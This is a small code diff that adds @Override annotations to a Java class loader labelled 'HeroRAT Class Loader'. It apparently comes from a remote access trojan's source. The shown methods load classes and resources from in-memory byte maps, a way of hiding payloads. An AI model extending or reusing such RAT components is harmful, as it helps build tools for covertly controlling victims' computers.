@@ -15,6 +15,7 @@ public class EncryptedClassLoader extends ClassLoader
 		this.resources = resources;
 	}
 
+	@Override
 	public Class<?> loadClass(String classToLoad) throws ClassNotFoundException
 	{
 		byte[] buffer = classes.remove(classToLoad);
@@ -26,12 +27,14 @@ public class EncryptedClassLoader extends ClassLoader
 		return super.loadClass(classToLoad);
 	}
 	
+	@Override
 	public InputStream getResourceAsStream(String name)
 	{
 		byte[] buffer = resources.get(name);
 		return new ByteArrayInputStream(buffer);
 	}
 	
+	@Override
 	public String toString()
 	{
 		return "HeroRAT Class Loader";
